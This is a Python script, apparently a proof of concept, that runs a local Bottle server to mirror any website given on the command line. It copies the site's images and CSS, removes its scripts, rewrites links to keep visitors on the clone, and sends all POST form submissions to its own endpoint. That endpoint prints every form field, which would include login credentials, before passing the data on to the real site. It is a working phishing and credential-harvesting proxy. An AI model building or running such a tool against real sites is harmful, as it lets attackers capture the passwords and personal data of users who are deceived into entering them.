from bottle import route, run, template, static_file, request, abort
import requests
from bs4 import BeautifulSoup
import shutil
from urllib.parse import urlparse, parse_qs
import json
import sys

# Usage: "python3 website.py <website>"
# The website should be in line with the base URL or there is potential
# to hit a redirect loop and quit out
# Example: "python3 website.py facebook.com" would not work because "www.facebook.com" is the redirect to the actual site
# instead you would use "python3 website.py www.facebook.com"
s = None
HOST = sys.argv[1]
BASE_URL = f'https://{HOST}'

# Base headers that the requests session is updated with
# Appear as a normal browser and not a script
headers = {
    'Host': HOST,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0',
    'Referer': f'{BASE_URL}/'
}

# Returning images from ./images directory
def image_index(image_name):
    print(f'[img] Found an img: {image_name}')
    return static_file(image_name, root='images')

# Returning CSS from ./css directory
def css_index(css_name):
    print(f'[css] Found some css: {css_name}')
    return static_file(css_name, root='css')

# Relative path can be useful for defining file resource endpoints in the directories
# or to relocate resources in href, src, and other URLs to the main site that might drag
# a user out of the current context
def get_rel_path(url):
    parsed = urlparse(url)
    if not parsed.path.startswith('/'):
        return f'/{parsed.path}'
    else:
        return parsed.path

# Useful for switching HOST for grabbing resources
def get_correct_base(url):
    parsed = urlparse(url)
    if parsed.netloc:
        return f'https://{parsed.netloc}'
    return BASE_URL

# All form redirected URLs are sent to this link
def do_form_action(form_path):
    global s
    global headers
    parsed = urlparse(form_path)

    if s is None:
        abort(404, 'Not found.')

    actual_path = get_rel_path(parsed.path)
    new_req_headers = headers.copy()
    print('[~] Form action')
    if request.method.upper() == 'POST':
        if parsed.netloc:
            new_req_headers['Host'] = parsed.netloc

        print(f'{BASE_URL}{actual_path}?{parsed.query}')

        # Print out all associated form fields and their content
        print('[*] Form Fields')
        for k,v in parse_qs(request.body.read()).items():
            print(f' |  {str(k)[2:-1]}: {str(v[0])[2:-1]}') # [2:-1] removes the b' prefix and the ' suffix

        if parsed.query:
            s = requests.post(f'{BASE_URL}{actual_path}?{parsed.query}', data=request.body.read(), headers=new_req_headers)
        else:
            s = requests.post(f'{BASE_URL}{actual_path}', data=request.body, headers=new_req_headers)

        soup = BeautifulSoup(s.content, 'html5lib')
        return str(soup)

    abort(404, 'Not found!')

@route('/<path:re:.*>', method='GET')
@route('/<path:re:.*>', method='POST')
def index(path=None):
    print(f'PATH: {path}')
    prefixes = [('do_form_action', do_form_action), ('images', image_index), ('css', css_index)]

    # In order to capture every single endpoint to the website, Bottle does not allow endpoint
    # descriptors if there is a catch all
    # This is a fix to forward action to the necessary callback function depending on the endpoint in the catch-all
    for prefix, callback in prefixes:
        if path is not None and path.startswith(prefix):
            return callback(path[len(prefix):])

    # No POST request should be hitting this point as is, it should be taken care of in do_form_action
    if request.method.upper() == 'POST':
        abort(403, 'Error')

    global s
    global headers

    # Maintain a session for the user
    # This is so the user can correctly be tracked and their actions will be replicated correctly
    # across the site that is being replicated
    s = requests.Session()
    s.headers.update(headers)
    request.path = get_rel_path(request.path)

    if request.query_string:
        new_request = f'{BASE_URL}{request.path}?{request.query_string}'
    else:
        new_request = f'{BASE_URL}{request.path}'
    print(f'[!!!] New request: {new_request}')
    r = s.get(new_request)
    soup = BeautifulSoup(r.content, 'html5lib')

    if path:
        anc = urlparse(path)
        if anc.netloc:
            headers['Host'] = anc.netloc

    before_headers = headers.copy()
    img_cache = {}

    # Downloads image src tags and replicates them in the ./img directory
    # It then replaces img src's with the relative path to the img directory
    # In some cases a "srcset" variable in the img tags can cause a problem (e.g. Google)
    # and so that tag is completely removed
    # This code also keeps an image cache as one image can appear many times in one page,
    # but we don't want to have to download that image many times
    # Example: news.ycombinator.com with the s.gif img on comments sections
    print('Moving to images')
    for img in soup.findAll('img', src=True):
        if img['src'].startswith('data:'): # Don't touch base64 image sources
            continue

        img_src = urlparse(img['src'])

        img_name = img['src'].rsplit('/', 1)[-1]
        response = 0

        if img.get('srcset', None) is not None:
            img['srcset'] = None

        if img['src'] not in img_cache:
            if img_src.netloc:
                headers['Host'] = img_src.netloc
                s.headers.update(headers)
            else:
                s.headers.update(before_headers)

            actual_base = get_correct_base(img['src'])
            actual_path = get_rel_path(img_src.path)
            img_url = f'{actual_base}{actual_path}'
            if img_src.query:
                img_url += f'?{img_src.query}'
            print(f'[img] Requesting: {img_url}')
            img_r = s.get(img_url, stream=True)
            response = img_r.status_code
            if response != 200:
                print(f'[img] Status: {img_r.status_code}')
                print(f'[img] Bad Headers: {s.headers}')
                continue

            with open(f'images/{img_name}', 'wb') as f:
                img_r.raw.decode_content = True
                shutil.copyfileobj(img_r.raw, f)

        dict_resp = img_cache.get(img['src'], response)
        img_cache[img['src']] = dict_resp 
        if dict_resp == 200:
            img['src'] = f'/images{get_rel_path(img_name)}'

    # Downloads all CSS
    # This does not replace main site URLs nor does it attempt to
    # This will replace the Host header especially when downloading otherwise
    # most of the time it would fail on grabbing the resources.
    # This saves the CSS in the local ./css directory and points the
    # CSS resource to the content in there
    print('Moving to CSS')
    find_css = soup.findAll('link', {'type':'text/css', 'href':True})
    find_css.extend(soup.findAll('link', {'rel':'stylesheet', 'href':True}))
    for css in find_css:
        css_href = urlparse(css['href'])

        if css_href.netloc:
            headers['Host'] = css_href.netloc
            s.headers.update(headers)
        else:
            s.headers.update(before_headers)

        actual_base = get_correct_base(css['href'])
        actual_path = get_rel_path(css_href.path)
        css_url = f'{actual_base}{actual_path}'
        print(f'[css] Requesting: {css_url}')
        css_r = s.get(css_url, stream=True)
        if css_r.status_code != 200:
            print(f'[css] Status Code: {css_r.status_code}')
            print(f'[css] Bad Headers: {s.headers}')
            continue
        css_name = css['href'].rsplit('/', 1)[-1]
        with open(f'css/{css_name}', 'wb') as f:
            css_r.raw.decode_content = True
            shutil.copyfileobj(css_r.raw, f)
        css['href'] = f'/css/{css_name}'

    # All forms are pointed to the do_form_action endpoint with the main site's
    # destination URL and content
    print('Moving to forms')
    headers = before_headers.copy()
    s.headers.update(headers)
    forms = soup.findAll('form', {'action': True})
    for form in forms:
        if form.get('method', 'GET').upper() == 'GET':
            parsed = urlparse(form['action'])
            form['action'] = parsed.path
        else:
            form['action'] = f'/do_form_action{get_rel_path(form["action"])}'

    # Change anchors to relative path to keep the user trapped within the site
    print('Moving to anchors')
    anchors = soup.findAll('a', {'href': True})
    for a in anchors:
        parsed = urlparse(a['href'])
        if parsed.query and parsed.netloc == HOST:
            a['href'] = f'{parsed.path}?{parsed.query}'
        elif parsed.netloc == HOST:
            a['href'] = f'{parsed.path}'

    # Delete onsubmit value from forms
    # This may break some forms, however it's mostly used to cleanse a "return false;" from an onsubmit value
    for fo in soup.findAll('form', {'onsubmit': True}):
        del fo['onsubmit']

    # Remove Javascript content. It almost always causes problems and is hard to scrape
    # for href's and other onclick URLs after it's loaded
    [s.extract() for s in soup('script')]
    # r.content = str(soup)
    return str(soup)

# Proof of concept so we just run on localhost:8080
run(host='localhost', port=8080)
